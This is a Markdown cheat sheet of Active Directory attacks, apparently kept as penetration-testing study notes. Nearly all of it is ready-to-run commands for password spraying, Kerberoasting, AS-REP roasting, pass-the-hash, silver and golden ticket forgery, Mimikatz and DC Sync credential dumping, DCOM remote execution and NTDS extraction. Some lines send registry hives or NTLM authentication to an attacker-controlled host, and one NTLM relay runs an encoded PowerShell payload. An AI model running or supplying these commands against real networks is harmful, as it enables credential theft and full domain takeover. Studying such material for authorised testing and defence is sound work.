---
layout: default
title: "AD Attacks"
parent: "Active Directory"
nav_order: 1
---

# Active Directory Attacks

## Tool Quick Reference

### Kerbrute
```
# User enumeration
kerbrute userenum --dc $ip -d CONTROLLER.local Users.txt

# Password spraying
.\kerbrute_linux_arm64 passwordspray -d $domain.com $usersFile "$password"
```
Note: Kerbrute is not on Kali by default. See PopMyKali repo for install.

### Impacket
```
impacket-smbclient [domain]/[user]:[password/hash]@[Target IP]
impacket-lookupsid [domain]/[user]:[password/hash]@[Target IP]
impacket-services [domain]/[user]:[password/hash]@[Target IP] [Action]
impacket-secretsdump [domain]/[user]:[password/hash]@[Target IP]
impacket-secretsdump -sam '/path/to/SAM' -system '/path/to/SYSTEM' LOCAL
impacket-GetUserSPNs [domain]/[user]:[password/hash]@[Target IP] -dc-ip <IP> -request
impacket-GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt

# RCE options
impacket-psexec test.local/john:password123@10.10.10.1
impacket-psexec -hashes lmhash:nthash test.local/john@10.10.10.1
impacket-wmiexec test.local/john:password123@10.10.10.1
impacket-wmiexec -hashes lmhash:nthash test.local/john@10.10.10.1
impacket-smbexec test.local/john:password123@10.10.10.1
impacket-atexec test.local/john:password123@10.10.10.1 <command>
```

Save SAM/SYSTEM/SECURITY all at once:
```
impacket-reg $domain/$user:$password@$target backup -o '\\ATTACKER_IP\someshare'
# (must start impacket-smbserver first)
```

#### NTLM Relay
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t $targetIP -c "powershell -enc JABjAGwAaQ..."
```
Receives an authentication request and re-routes it to `$targetIP`.

#### mssqlclient
```
impacket-mssqlclient $user:$pass@$target -windows-auth
```

### Evil-WinRM
```
# WinRM discovery
nmap -p5985,5986 <IP>
# 5985 = plaintext, 5986 = encrypted

# Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S   # port 5986

# Login with hash
evil-winrm -i <IP> -u user -H ntlmhash

# Login with certificate
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S

# File transfer
upload <file>
download <file> <filepath-kali>

# Load scripts from Kali
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

# Run binaries
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```

### NXC (NetExec / CrackMapExec)
```
nxc smb --help

# Add | grep + to only show positive results

# Enumeration flags: --users, --shares, --loggedon-users, --groups
# Spider shares: -M spider_plus --share $share
# Password policy: --pass-pol

# Password spraying
nxc smb $IP -u users.txt -p 'password' -d domain.com --continue-on-success
nxc smb 0/24 -u users.txt -p 'password' -d domain.com   # whole subnet

# Pass the hash
nxc smb $IP -u $user -H $NTLMHash --local-auth
nxc smb $IP -u $user -H $NTLMHash --local-auth --sam
nxc smb $IP -u $user -H $NTLMHash --local-auth --lsa
nxc smb $IP -u $user -H $NTLMHash --local-auth --shares

# Modules
nxc smb $IP -u $user -H $NTLMHash --local-auth -M lsassy
nxc smb $targetIP -d $domain.com -u $user -p $password -M slinky -o NAME=$filename SERVER=$attackerIP
```

### Rubeus (local, on Windows target)
```
Rubeus.exe harvest /interval:30          # harvest tickets every 30s
Rubeus.exe kerberoast                    # get hashes of Kerberoastable accounts
Rubeus.exe kerberoast /outfile:hashes.kerberoast /tgtdeleg   # RC4 only (faster to crack)
Rubeus.exe asreproast /nowrap            # AS-REP roast
# NOTE: may need to add $23$ to hash format for hashcat - check format carefully!
```

---

## Credential Attacks

### Password Spraying

**Post-compromise quick win.** Try once you have a user list.

```
# NXC
nxc smb $IP -u users.txt -p 'Password123' -d domain.com --continue-on-success

# Kerbrute
.\kerbrute_linux_arm64 passwordspray -d $domain.com $usersFile "$password"

# Impacket (bash loop for AS-REP)
for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 $domain/${user} | grep -v Impacket; done
```

### AS-REP Roasting
Requires accounts with `PreauthNotRequired` enabled.

```
# Remote (Impacket)
impacket-GetNPUsers -dc-ip $IP -request -outfile $outfile.asreproast $domain.com/$user

# Local (Rubeus)
.\Rubeus.exe asreproast /nowrap

# Enum via PowerView
Get-DomainUser -PreauthNotRequired

# Crack with hashcat (mode 18200)
hashcat -m 18200 hash.txt wordlist.txt
```

### Kerberoasting
SPNs are unique identifiers Kerberos uses to map a service instance to a service account. Requires access as any domain user.

```
# Remote (Impacket)
sudo impacket-GetUserSPNs -request -dc-ip $IP $domain.com/$user

# Local (Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /tgtdeleg   # force RC4

# Local (PowerView)
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Crack with hashcat (mode 13100)
hashcat -m 13100 hashes.kerberoast wordlist.txt
```

---

## Ticket Attacks

### Pass the Hash / Pass the Ticket

**Pass the Hash** — use NTLM hash directly:
```
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@$target
impacket-psexec -hashes lmhash:nthash test.local/john@10.10.10.1
```

**Overpass the Hash** — convert NTLM hash to Kerberos TGT:
```
# From mimikatz
sekurlsa::pth /user:$user /domain:$domain.com /ntlm:$NTLM /run:powershell
# Then authenticate with this account (e.g., net use \\smbserver) to cache a TGT
# Verify with: klist
```

**Pass the Ticket** — export and re-inject a TGS:
Requires access to the domain as a user. Takes advantage of TGS which can be exported and re-injected.
```
# From mimikatz
sekurlsa::tickets /export
# Find ticket: dir *.kirbi
# Example name: [0;12bd0]-0-0-42830000-patches@cifs-web42.kirbi
kerberos::ptt [0;12bd0]-0-0-42830000-patches@cifs-web42.kirbi
# Verify: klist
```

### Silver Ticket
Forging a service ticket (TGS). Bypasses KDC entirely — only logs on targeted server.

Requires:
1. SPN password hash (NTLM of service account) — can generate from plaintext at codebeautify.org/ntlm-hash-generator
2. Domain SID — `Get-ADDomain` (format: `S-1-5-21-...`)
3. Target SPN — `Get-ADUser -Filter {SamAccountName -eq "$user"} -Properties ServicePrincipalNames` (e.g., `MSSQL/nagoya.nagoya-industries.com`)

```
# Remote (Impacket)
impacket-ticketer -nthash $NTLMHash -domain-sid $SID -domain $domain.com -spn $SPN -user-id 500 Administrator

# Local (Mimikatz)
kerberos::golden /sid:S-1-5-21-... /domain:$domain.com /ptt /target:$host.$domain.com /service:http /rc4:$NTLM_hash /user:$user

# THM method
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname> /rc4:<NTLM Hash of machine account> /service:cifs /ptt
# Verify: dir \\thmserver1.za.tryhackme.loc\c$\
```

Note: Machine account passwords rotate every 30 days. Modify registry parameter to persist.

### Golden Ticket
Forging a TGT. Requires full domain compromise (KRBTGT hash).

```
# Step 1 - get KRBTGT hash and domain SID
privilege::debug
lsadump::lsa /patch
# Note the SID and NTLM of krbtgt account

# Step 2 - on any machine (even non-domain-joined)
kerberos::purge
kerberos::golden /user:$user /domain:$domain.com /sid:$SID /krbtgt:$krbtgtNTLM /ptt
misc::cmd
# Then: PsExec.exe \\$targetmachine cmd.exe
# NOTE: use hostname NOT IP (for Kerberos auth, not NTLM)

# THM extended method (set long ticket lifetime)
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT> /endin:600 /renewmax:10080 /ptt
```

Key notes on Golden Tickets:
- KDC only validates the user account in TGT if it's older than 20 minutes — can use disabled/deleted/non-existent accounts.
- KRBTGT password almost never changes by default — persistent access.
- Blue team must rotate KRBTGT password TWICE (current and previous are both valid).
- Works even on non-domain-joined machines.
- Bypasses smart card authentication.

---

## Credential Dumping

### Mimikatz
```
mimikatz.exe
privilege::debug            # must get output "20" or it won't work
sekurlsa::tickets /export   # export tickets; impersonate with kerberos::ptt $ticket
sekurlsa::logonpasswords    # dump plaintext creds / hashes
lsadump::lsa /patch         # dump hashes (on DC)
lsadump::lsa /inject /name:krbtgt   # dump krbtgt hash for golden ticket
```

### DC Sync
Impersonate a Domain Controller to pull credentials. Requires replication rights (Domain Admins, Enterprise Admins, or Administrators).

```
# Local (Mimikatz)
lsadump::dcsync /user:$domain\$user          # single user (e.g., corp\david)
log <username>_dcdump.txt
lsadump::dcsync /domain:za.tryhackme.loc /all   # dump ALL accounts

# Parse output
cat $username_dcdump.txt | grep "SAM Username"
cat $username_dcdump.txt | grep "Hash NTLM"

# Remote (Impacket)
impacket-secretsdump -just-dc-user $Targetuser $domain.com/$pwnedUser:"$password"@$IP
impacket-secretsdump [domain]/[user]:[password/hash]@[Target IP]
```

---

## Lateral Movement

### Token Impersonation
Tokens are temporary keys that allow access without providing credentials each time.
- **Delegate tokens** — created for logging into a machine or using RDP
- **Impersonate tokens** — "non-interactive" (e.g., attaching a network drive, domain logon script)

```
# Via meterpreter
load incognito
list_tokens -u
impersonate_token domain\\user   # two backslashes required
# Then: add a user account, or use secretsdump with that account
```

### DCOM
The Distributed Component Object Model allows software components to interact. Communicates over RPC on TCP port 135.

```powershell
# Create remote MMC application instance
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","$targetIP"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
# Replace calc with your payload

# Excel-based DCOM payload
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "[target_workstation]"))
$LocalPath = "C:\Users\[user]\badexcel.xls"
$RemotePath = "\\[target]\c$\badexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$path = "\\[target]\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("mymacro")
```

---

## Other Attacks

### LNK File Attacks
Generates a file that triggers an authentication attempt to capture NTLM hash via Responder.

```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\192.168.138.149\@test.png"   # your Kali IP
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```

Or using NXC slinky module (delivers to a share):
```
nxc smb $targetIP -d $domain.com -u $user -p $password -M slinky -o NAME=$filename SERVER=$attackerIP
```
Then catch NTLM with Responder on attacker IP.

### GPP Attacks (cPassword Attack)
Group Policy Preferences allowed admins to create policies with embedded credentials encrypted with a "cPassword". The key was accidentally released. Patched in MS14-025 but doesn't remove previous uses.

```
# Look in SYSVOL for Groups.xml
# Search for: cPassword="..."
gpp-decrypt <cpassword_value>

# Enumerate via SMB
ls \\dc1.corp.com\sysvol\corp.com\
```

### Shadow Copies
Extract the AD database `NTDS.dit` file. Uses Windows SDK `vshadow.exe`. Noisier than DC Sync.

```
# As admin on DC
vshadow.exe -nw -p C:
# Note: "Shadow copy device name:" value as $ShadowCopyName

copy $ShadowCopyName\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak

# Move ntds.dit.bak and system.bak to Kali
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

## Post-Compromise Strategy

**Quick wins (try first):**
- Kerberoasting
- Secretsdump / DC Sync
- Pass the hash/password

**No quick wins:**
- Enumerate with BloodHound
- Where does the account have access?
- Old vulnerabilities
- Think outside the box
- NTDS contains all AD information
